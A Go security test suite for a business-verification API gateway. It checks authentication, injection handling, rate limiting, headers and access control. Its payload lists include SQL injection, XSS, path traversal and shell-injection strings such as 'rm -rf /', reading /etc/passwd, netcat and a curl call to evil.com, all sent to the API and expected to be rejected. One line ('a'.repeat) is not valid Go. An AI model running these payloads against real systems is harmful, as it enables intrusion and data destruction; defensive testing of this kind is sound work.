package security

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"
)

// SecurityTestSuite provides comprehensive security testing for all KYB services
type SecurityTestSuite struct {
	suite.Suite
	baseURL    string
	apiGateway *APIGatewayClient
	httpClient *http.Client
	config     *SecurityConfig
}

// SecurityConfig contains security test configuration
type SecurityConfig struct {
	BaseURL       string
	Timeout       time.Duration
	TestAPIKey    string
	InvalidAPIKey string
	AdminAPIKey   string
	UserAPIKey    string
	TestUserID    string
	TestTenantID  string
}

// SecurityTestResult represents the result of a security test
type SecurityTestResult struct {
	TestName       string                 `json:"test_name"`
	Status         string                 `json:"status"`
	Vulnerability  string                 `json:"vulnerability,omitempty"`
	Severity       string                 `json:"severity,omitempty"`
	Description    string                 `json:"description"`
	Recommendation string                 `json:"recommendation,omitempty"`
	Details        map[string]interface{} `json:"details"`
	Timestamp      time.Time              `json:"timestamp"`
}

// BusinessVerificationRequest represents a business verification request
type BusinessVerificationRequest struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Address     string `json:"address"`
	Industry    string `json:"industry"`
	Website     string `json:"website,omitempty"`
	Phone       string `json:"phone,omitempty"`
	Email       string `json:"email,omitempty"`
}

// HTTPResponse represents an HTTP response
type HTTPResponse struct {
	StatusCode int
	Body       []byte
	Headers    http.Header
	Duration   time.Duration
}

// ErrorResponse represents an error response
type ErrorResponse struct {
	Error   string `json:"error"`
	Message string `json:"message"`
	Code    int    `json:"code"`
}

// SetupSuite initializes the security test suite
func (suite *SecurityTestSuite) SetupSuite() {
	// Load security test configuration
	suite.config = suite.loadSecurityConfig()

	// Initialize HTTP client
	suite.httpClient = &http.Client{
		Timeout: suite.config.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Don't follow redirects for security testing
			return http.ErrUseLastResponse
		},
	}

	// Initialize API Gateway client
	suite.apiGateway = &APIGatewayClient{
		baseURL: suite.config.BaseURL,
		client:  suite.httpClient,
	}

	suite.baseURL = suite.config.BaseURL
}

// loadSecurityConfig loads security test configuration
func (suite *SecurityTestSuite) loadSecurityConfig() *SecurityConfig {
	config := &SecurityConfig{
		BaseURL:       getEnv("SEC_TEST_BASE_URL", "https://kyb-api-gateway-production.up.railway.app"),
		Timeout:       30 * time.Second,
		TestAPIKey:    getEnv("SEC_TEST_API_KEY", "test-api-key"),
		InvalidAPIKey: "invalid-api-key",
		AdminAPIKey:   getEnv("SEC_ADMIN_API_KEY", "admin-api-key"),
		UserAPIKey:    getEnv("SEC_USER_API_KEY", "user-api-key"),
		TestUserID:    "test-user-123",
		TestTenantID:  "test-tenant-456",
	}

	return config
}

// getEnv gets environment variable with default value
func getEnv(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}

// TestAuthenticationSecurity tests authentication and authorization security
func (suite *SecurityTestSuite) TestAuthenticationSecurity() {
	suite.Run("Missing_Authentication", func() {
		// Test request without authentication
		resp, err := suite.makeRequest("GET", suite.baseURL+"/verify", nil, "")
		require.NoError(suite.T(), err, "Request should not fail at HTTP level")

		// Should return 401 Unauthorized
		assert.Equal(suite.T(), http.StatusUnauthorized, resp.StatusCode,
			"Request without authentication should return 401")
	})

	suite.Run("Invalid_API_Key", func() {
		// Test request with invalid API key
		resp, err := suite.makeRequest("GET", suite.baseURL+"/verify", nil, suite.config.InvalidAPIKey)
		require.NoError(suite.T(), err, "Request should not fail at HTTP level")

		// Should return 401 Unauthorized
		assert.Equal(suite.T(), http.StatusUnauthorized, resp.StatusCode,
			"Request with invalid API key should return 401")
	})

	suite.Run("Valid_API_Key", func() {
		// Test request with valid API key
		resp, err := suite.makeRequest("GET", suite.baseURL+"/health", nil, suite.config.TestAPIKey)
		require.NoError(suite.T(), err, "Request should not fail at HTTP level")

		// Should return 200 OK
		assert.Equal(suite.T(), http.StatusOK, resp.StatusCode,
			"Request with valid API key should return 200")
	})

	suite.Run("API_Key_Format_Validation", func() {
		// Test various invalid API key formats
		invalidKeys := []string{
			"",                                 // Empty key
			" ",                                // Space
			"invalid",                          // Too short
			"a".repeat(1000),                   // Too long
			"key with spaces",                  // Contains spaces
			"key\nwith\nnewlines",              // Contains newlines
			"key\twith\ttabs",                  // Contains tabs
			"key<script>alert('xss')</script>", // XSS attempt
		}

		for _, invalidKey := range invalidKeys {
			resp, err := suite.makeRequest("GET", suite.baseURL+"/verify", nil, invalidKey)
			require.NoError(suite.T(), err, "Request should not fail at HTTP level")

			assert.Equal(suite.T(), http.StatusUnauthorized, resp.StatusCode,
				"Invalid API key format '%s' should return 401", invalidKey)
		}
	})
}

// TestInputValidationSecurity tests input validation and sanitization
func (suite *SecurityTestSuite) TestInputValidationSecurity() {
	suite.Run("SQL_Injection_Attempts", func() {
		// Test SQL injection attempts in various fields
		sqlInjectionPayloads := []string{
			"'; DROP TABLE users; --",
			"' OR '1'='1",
			"' UNION SELECT * FROM users --",
			"'; INSERT INTO users VALUES ('hacker', 'password'); --",
			"' OR 1=1 --",
			"admin'--",
			"admin'/*",
			"' OR 'x'='x",
			"') OR ('1'='1",
		}

		for _, payload := range sqlInjectionPayloads {
			testBusiness := BusinessVerificationRequest{
				Name:        payload,
				Description: "Test business",
				Address:     "123 Test Street",
				Industry:    "Technology",
			}

			resp, err := suite.apiGateway.VerifyBusiness(testBusiness, suite.config.TestAPIKey)
			require.NoError(suite.T(), err, "Request should not fail at HTTP level")

			// Should not return 500 (internal server error) indicating SQL injection
			assert.NotEqual(suite.T(), http.StatusInternalServerError, resp.StatusCode,
				"SQL injection payload '%s' should not cause internal server error", payload)

			// Should return 400 (bad request) for invalid input
			assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode,
				"SQL injection payload '%s' should return 400", payload)
		}
	})

	suite.Run("XSS_Attempts", func() {
		// Test XSS attempts in various fields
		xssPayloads := []string{
			"<script>alert('xss')</script>",
			"<img src=x onerror=alert('xss')>",
			"javascript:alert('xss')",
			"<svg onload=alert('xss')>",
			"<iframe src=javascript:alert('xss')></iframe>",
			"<body onload=alert('xss')>",
			"<input onfocus=alert('xss') autofocus>",
			"<select onfocus=alert('xss') autofocus>",
			"<textarea onfocus=alert('xss') autofocus>",
			"<keygen onfocus=alert('xss') autofocus>",
			"<video><source onerror=alert('xss')>",
			"<audio src=x onerror=alert('xss')>",
		}

		for _, payload := range xssPayloads {
			testBusiness := BusinessVerificationRequest{
				Name:        payload,
				Description: "Test business",
				Address:     "123 Test Street",
				Industry:    "Technology",
			}

			resp, err := suite.apiGateway.VerifyBusiness(testBusiness, suite.config.TestAPIKey)
			require.NoError(suite.T(), err, "Request should not fail at HTTP level")

			// Should return 400 (bad request) for invalid input
			assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode,
				"XSS payload '%s' should return 400", payload)

			// Response body should not contain the XSS payload
			assert.NotContains(suite.T(), string(resp.Body), payload,
				"Response should not contain XSS payload '%s'", payload)
		}
	})

	suite.Run("Command_Injection_Attempts", func() {
		// Test command injection attempts
		commandInjectionPayloads := []string{
			"; ls -la",
			"| cat /etc/passwd",
			"&& whoami",
			"`id`",
			"$(whoami)",
			"; rm -rf /",
			"| nc -l 1234",
			"&& curl http://evil.com",
		}

		for _, payload := range commandInjectionPayloads {
			testBusiness := BusinessVerificationRequest{
				Name:        payload,
				Description: "Test business",
				Address:     "123 Test Street",
				Industry:    "Technology",
			}

			resp, err := suite.apiGateway.VerifyBusiness(testBusiness, suite.config.TestAPIKey)
			require.NoError(suite.T(), err, "Request should not fail at HTTP level")

			// Should return 400 (bad request) for invalid input
			assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode,
				"Command injection payload '%s' should return 400", payload)
		}
	})

	suite.Run("Path_Traversal_Attempts", func() {
		// Test path traversal attempts
		pathTraversalPayloads := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			"....//....//....//etc/passwd",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			"..%252F..%252F..%252Fetc%252Fpasswd",
		}

		for _, payload := range pathTraversalPayloads {
			testBusiness := BusinessVerificationRequest{
				Name:        payload,
				Description: "Test business",
				Address:     "123 Test Street",
				Industry:    "Technology",
			}

			resp, err := suite.apiGateway.VerifyBusiness(testBusiness, suite.config.TestAPIKey)
			require.NoError(suite.T(), err, "Request should not fail at HTTP level")

			// Should return 400 (bad request) for invalid input
			assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode,
				"Path traversal payload '%s' should return 400", payload)
		}
	})

	suite.Run("Large_Payload_Attacks", func() {
		// Test large payload attacks
		largePayload := strings.Repeat("A", 10000) // 10KB payload

		testBusiness := BusinessVerificationRequest{
			Name:        largePayload,
			Description: largePayload,
			Address:     largePayload,
			Industry:    largePayload,
		}

		resp, err := suite.apiGateway.VerifyBusiness(testBusiness, suite.config.TestAPIKey)
		require.NoError(suite.T(), err, "Request should not fail at HTTP level")

		// Should return 400 (bad request) for oversized input
		assert.Equal(suite.T(), http.StatusBadRequest, resp.StatusCode,
			"Large payload should return 400")
	})
}

// TestRateLimitingSecurity tests rate limiting and DoS protection
func (suite *SecurityTestSuite) TestRateLimitingSecurity() {
	suite.Run("Rate_Limiting_Enforcement", func() {
		// Test rate limiting by making many requests quickly
		requestCount := 100
		successCount := 0
		rateLimitedCount := 0

		for i := 0; i < requestCount; i++ {
			resp, err := suite.makeRequest("GET", suite.baseURL+"/health", nil, suite.config.TestAPIKey)
			require.NoError(suite.T(), err, "Request should not fail at HTTP level")

			if resp.StatusCode == http.StatusOK {
				successCount++
			} else if resp.StatusCode == http.StatusTooManyRequests {
				rateLimitedCount++
			}

			// Small delay to avoid overwhelming the system
			time.Sleep(10 * time.Millisecond)
		}

		suite.T().Logf("Rate limiting test: %d successful, %d rate limited", successCount, rateLimitedCount)

		// Should have some rate limiting in place
		assert.Greater(suite.T(), rateLimitedCount, 0, "Rate limiting should be enforced")
	})

	suite.Run("Burst_Request_Protection", func() {
		// Test burst request protection
		burstSize := 50
		rateLimitedCount := 0

		// Make burst requests
		for i := 0; i < burstSize; i++ {
			resp, err := suite.makeRequest("GET", suite.baseURL+"/health", nil, suite.config.TestAPIKey)
			require.NoError(suite.T(), err, "Request should not fail at HTTP level")

			if resp.StatusCode == http.StatusTooManyRequests {
				rateLimitedCount++
			}
		}

		suite.T().Logf("Burst protection test: %d rate limited out of %d requests", rateLimitedCount, burstSize)

		// Should have some burst protection
		assert.Greater(suite.T(), rateLimitedCount, 0, "Burst protection should be enforced")
	})
}

// TestDataSecurity tests data security and privacy
func (suite *SecurityTestSuite) TestDataSecurity() {
	suite.Run("Sensitive_Data_Exposure", func() {
		// Test that sensitive data is not exposed in responses
		resp, err := suite.makeRequest("GET", suite.baseURL+"/health", nil, suite.config.TestAPIKey)
		require.NoError(suite.T(), err, "Request should not fail at HTTP level")

		responseBody := string(resp.Body)

		// Check for sensitive data patterns
		sensitivePatterns := []string{
			"password",
			"secret",
			"key",
			"token",
			"credential",
			"private",
			"internal",
			"admin",
			"root",
		}

		for _, pattern := range sensitivePatterns {
			assert.NotContains(suite.T(), strings.ToLower(responseBody), pattern,
				"Response should not contain sensitive data pattern '%s'", pattern)
		}
	})

	suite.Run("Error_Message_Information_Disclosure", func() {
		// Test that error messages don't disclose sensitive information
		resp, err := suite.makeRequest("GET", suite.baseURL+"/nonexistent", nil, suite.config.TestAPIKey)
		require.NoError(suite.T(), err, "Request should not fail at HTTP level")

		responseBody := string(resp.Body)

		// Check for information disclosure patterns
		disclosurePatterns := []string{
			"stack trace",
			"exception",
			"error at line",
			"file path",
			"database error",
			"sql error",
			"internal error",
		}

		for _, pattern := range disclosurePatterns {
			assert.NotContains(suite.T(), strings.ToLower(responseBody), pattern,
				"Error response should not contain disclosure pattern '%s'", pattern)
		}
	})
}

// TestHTTPSecurity tests HTTP security headers and configurations
func (suite *SecurityTestSuite) TestHTTPSecurity() {
	suite.Run("Security_Headers", func() {
		// Test that security headers are present
		resp, err := suite.makeRequest("GET", suite.baseURL+"/health", nil, suite.config.TestAPIKey)
		require.NoError(suite.T(), err, "Request should not fail at HTTP level")

		// Check for important security headers
		securityHeaders := map[string]string{
			"X-Content-Type-Options":    "nosniff",
			"X-Frame-Options":           "DENY",
			"X-XSS-Protection":          "1; mode=block",
			"Strict-Transport-Security": "max-age=31536000; includeSubDomains",
		}

		for header, expectedValue := range securityHeaders {
			actualValue := resp.Headers.Get(header)
			if expectedValue != "" {
				assert.Equal(suite.T(), expectedValue, actualValue,
					"Security header '%s' should be set to '%s'", header, expectedValue)
			} else {
				assert.NotEmpty(suite.T(), actualValue,
					"Security header '%s' should be present", header)
			}
		}
	})

	suite.Run("CORS_Configuration", func() {
		// Test CORS configuration
		req, err := http.NewRequest("OPTIONS", suite.baseURL+"/health", nil)
		require.NoError(suite.T(), err, "Failed to create OPTIONS request")

		req.Header.Set("Origin", "https://malicious-site.com")
		req.Header.Set("Access-Control-Request-Method", "POST")
		req.Header.Set("Access-Control-Request-Headers", "Content-Type")

		resp, err := suite.httpClient.Do(req)
		require.NoError(suite.T(), err, "OPTIONS request should not fail")
		defer resp.Body.Close()

		// Check CORS headers
		allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
		allowMethods := resp.Header.Get("Access-Control-Allow-Methods")
		allowHeaders := resp.Header.Get("Access-Control-Allow-Headers")

		// CORS should be properly configured
		assert.NotEmpty(suite.T(), allowOrigin, "CORS Allow-Origin should be set")
		assert.NotEmpty(suite.T(), allowMethods, "CORS Allow-Methods should be set")
		assert.NotEmpty(suite.T(), allowHeaders, "CORS Allow-Headers should be set")
	})
}

// TestAuthorizationSecurity tests authorization and access control
func (suite *SecurityTestSuite) TestAuthorizationSecurity() {
	suite.Run("Privilege_Escalation_Attempts", func() {
		// Test privilege escalation attempts
		privilegeEscalationTests := []struct {
			name           string
			apiKey         string
			endpoint       string
			expectedStatus int
		}{
			{
				name:           "User_Accessing_Admin_Endpoint",
				apiKey:         suite.config.UserAPIKey,
				endpoint:       "/admin/users",
				expectedStatus: http.StatusForbidden,
			},
			{
				name:           "User_Accessing_System_Endpoint",
				apiKey:         suite.config.UserAPIKey,
				endpoint:       "/system/metrics",
				expectedStatus: http.StatusForbidden,
			},
			{
				name:           "Admin_Accessing_Admin_Endpoint",
				apiKey:         suite.config.AdminAPIKey,
				endpoint:       "/admin/users",
				expectedStatus: http.StatusOK,
			},
		}

		for _, test := range privilegeEscalationTests {
			suite.Run(test.name, func() {
				resp, err := suite.makeRequest("GET", suite.baseURL+test.endpoint, nil, test.apiKey)
				require.NoError(suite.T(), err, "Request should not fail at HTTP level")

				assert.Equal(suite.T(), test.expectedStatus, resp.StatusCode,
					"Privilege escalation test '%s' should return %d", test.name, test.expectedStatus)
			})
		}
	})

	suite.Run("Resource_Access_Control", func() {
		// Test resource access control
		resourceAccessTests := []struct {
			name           string
			apiKey         string
			resourceID     string
			expectedStatus int
		}{
			{
				name:           "Accessing_Own_Resource",
				apiKey:         suite.config.UserAPIKey,
				resourceID:     suite.config.TestUserID,
				expectedStatus: http.StatusOK,
			},
			{
				name:           "Accessing_Other_User_Resource",
				apiKey:         suite.config.UserAPIKey,
				resourceID:     "other-user-123",
				expectedStatus: http.StatusForbidden,
			},
		}

		for _, test := range resourceAccessTests {
			suite.Run(test.name, func() {
				endpoint := fmt.Sprintf("/users/%s", test.resourceID)
				resp, err := suite.makeRequest("GET", suite.baseURL+endpoint, nil, test.apiKey)
				require.NoError(suite.T(), err, "Request should not fail at HTTP level")

				assert.Equal(suite.T(), test.expectedStatus, resp.StatusCode,
					"Resource access test '%s' should return %d", test.name, test.expectedStatus)
			})
		}
	})
}

// Helper methods
func (suite *SecurityTestSuite) makeRequest(method, url string, body interface{}, apiKey string) (*HTTPResponse, error) {
	var reqBody io.Reader
	if body != nil {
		jsonData, err := json.Marshal(body)
		if err != nil {
			return nil, err
		}
		reqBody = bytes.NewBuffer(jsonData)
	}

	req, err := http.NewRequest(method, url, reqBody)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	if apiKey != "" {
		req.Header.Set("Authorization", "Bearer "+apiKey)
	}

	start := time.Now()
	resp, err := suite.httpClient.Do(req)
	duration := time.Since(start)

	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return &HTTPResponse{
		StatusCode: resp.StatusCode,
		Body:       respBody,
		Headers:    resp.Header,
		Duration:   duration,
	}, nil
}

// APIGatewayClient represents the API Gateway client for security testing
type APIGatewayClient struct {
	baseURL string
	client  *http.Client
}

// VerifyBusiness sends a business verification request
func (c *APIGatewayClient) VerifyBusiness(business BusinessVerificationRequest, apiKey string) (*HTTPResponse, error) {
	jsonData, err := json.Marshal(business)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", c.baseURL+"/verify", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	if apiKey != "" {
		req.Header.Set("Authorization", "Bearer "+apiKey)
	}

	start := time.Now()
	resp, err := c.client.Do(req)
	duration := time.Since(start)

	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return &HTTPResponse{
		StatusCode: resp.StatusCode,
		Body:       body,
		Headers:    resp.Header,
		Duration:   duration,
	}, nil
}

// TestSecuritySuite runs the complete security test suite
func TestSecuritySuite(t *testing.T) {
	suite.Run(t, new(SecurityTestSuite))
}
